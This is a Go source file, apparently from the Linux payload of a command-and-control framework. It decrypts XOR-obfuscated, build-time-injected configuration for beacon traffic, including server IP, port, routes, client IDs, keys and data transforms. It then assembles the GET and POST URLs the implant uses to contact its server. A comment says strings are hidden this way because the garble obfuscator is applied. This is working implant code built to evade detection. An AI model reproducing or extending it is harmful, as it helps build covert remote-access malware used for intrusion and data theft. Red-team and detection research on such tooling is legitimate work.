// server/docker/payloads/Linux/getEnv.go

//go:build linux
// +build linux

package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

// DecryptedConfig holds all decrypted configuration values
// Using a struct instead of map[string]string because garble obfuscates struct field names
type DecryptedConfig struct {
	UserAgent              string
	ContentType            string
	CustomHeaders          string
	GetRoute               string
	PostRoute              string
	GetMethod              string
	PostMethod             string
	GetClientIDName        string
	GetClientIDFormat      string
	PostClientIDName       string
	PostClientIDFormat     string
	PostSecretName         string
	PostSecretFormat       string
	PublicKey              string
	Secret                 string
	Protocol               string
	IP                     string
	Port                   string
	GetClientIDTransforms  string
	PostClientIDTransforms string
	PostDataTransforms     string
	ResponseDataTransforms string
}

// HTTP protocol strings - injected at build time (XOR encrypted)
var (
	geMethodGet      string // GET
	geMethodPost     string // POST
	geProtoHttps     string // https
	geProtoHttp      string // http
	gePort443        string // 443
	gePort80         string // 80
	geFmtUrlNoPort   string // %s://%s
	geFmtUrlWithPort string // %s://%s:%s
	geFmtUrlQuery    string // %s%s?%s=%s
	geSlash          string // /
)

func init() {
	// Decrypt HTTP protocol strings at startup
	geMethodGet, _ = xorDecrypt(geMethodGet, xorKey)
	geMethodPost, _ = xorDecrypt(geMethodPost, xorKey)
	geProtoHttps, _ = xorDecrypt(geProtoHttps, xorKey)
	geProtoHttp, _ = xorDecrypt(geProtoHttp, xorKey)
	gePort443, _ = xorDecrypt(gePort443, xorKey)
	gePort80, _ = xorDecrypt(gePort80, xorKey)
	geFmtUrlNoPort, _ = xorDecrypt(geFmtUrlNoPort, xorKey)
	geFmtUrlWithPort, _ = xorDecrypt(geFmtUrlWithPort, xorKey)
	geFmtUrlQuery, _ = xorDecrypt(geFmtUrlQuery, xorKey)
	geSlash, _ = xorDecrypt(geSlash, xorKey)
}

func xorDecrypt(encoded, key string) (string, error) {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	var result []byte
	for i := 0; i < len(decoded); i++ {
		result = append(result, decoded[i]^key[i%len(key)])
	}

	return string(result), nil
}

func decryptAllValues() *DecryptedConfig {
	cfg := &DecryptedConfig{}

	cfg.UserAgent, _ = xorDecrypt(userAgent, xorKey)
	cfg.ContentType, _ = xorDecrypt(contentType, xorKey)
	cfg.CustomHeaders, _ = xorDecrypt(customHeaders, xorKey)
	cfg.GetRoute, _ = xorDecrypt(getRoute, xorKey)
	cfg.PostRoute, _ = xorDecrypt(postRoute, xorKey)
	cfg.GetMethod, _ = xorDecrypt(getMethod, xorKey)
	cfg.PostMethod, _ = xorDecrypt(postMethod, xorKey)
	cfg.GetClientIDName, _ = xorDecrypt(getClientIDName, xorKey)
	cfg.GetClientIDFormat, _ = xorDecrypt(getClientIDFormat, xorKey)
	cfg.PostClientIDName, _ = xorDecrypt(postClientIDName, xorKey)
	cfg.PostClientIDFormat, _ = xorDecrypt(postClientIDFormat, xorKey)
	cfg.PostSecretName, _ = xorDecrypt(postSecretName, xorKey)
	cfg.PostSecretFormat, _ = xorDecrypt(postSecretFormat, xorKey)
	cfg.PublicKey, _ = xorDecrypt(publicKey, xorKey)
	cfg.Secret, _ = xorDecrypt(secret, xorKey)
	cfg.Protocol, _ = xorDecrypt(protocol, xorKey)
	cfg.IP, _ = xorDecrypt(ip, xorKey)
	cfg.Port, _ = xorDecrypt(port, xorKey)
	cfg.GetClientIDTransforms, _ = xorDecrypt(getClientIDTransforms, xorKey)
	cfg.PostClientIDTransforms, _ = xorDecrypt(postClientIDTransforms, xorKey)
	cfg.PostDataTransforms, _ = xorDecrypt(postDataTransforms, xorKey)
	cfg.ResponseDataTransforms, _ = xorDecrypt(responseDataTransforms, xorKey)

	// Set defaults for HTTP methods if they're empty
	if cfg.GetMethod == "" {
		cfg.GetMethod = geMethodGet
	}
	if cfg.PostMethod == "" {
		cfg.PostMethod = geMethodPost
	}

	return cfg
}

// buildBaseURL constructs the base URL using protocol, IP and port
func buildBaseURL(proto, ipAddr, portNum string) string {
	proto = strings.ToLower(proto)

	// Check if we should omit the port for standard HTTP/HTTPS ports
	if (proto == geProtoHttps && portNum == gePort443) || (proto == geProtoHttp && portNum == gePort80) {
		return fmt.Sprintf(geFmtUrlNoPort, proto, ipAddr)
	}

	return fmt.Sprintf(geFmtUrlWithPort, proto, ipAddr, portNum)
}

// buildGetURL constructs the complete GET URL
func buildGetURL(baseURL, getRouteVal, clientIDName string, clientIDVal string) string {
	if !strings.HasPrefix(getRouteVal, geSlash) {
		getRouteVal = geSlash + getRouteVal
	}

	return fmt.Sprintf(geFmtUrlQuery, baseURL, getRouteVal, clientIDName, clientIDVal)
}

// buildPostURL constructs the complete POST URL
func buildPostURL(baseURL, postRouteVal, clientIDName string, clientIDVal string) string {
	if !strings.HasPrefix(postRouteVal, geSlash) {
		postRouteVal = geSlash + postRouteVal
	}

	return fmt.Sprintf(geFmtUrlQuery, baseURL, postRouteVal, clientIDName, clientIDVal)
}
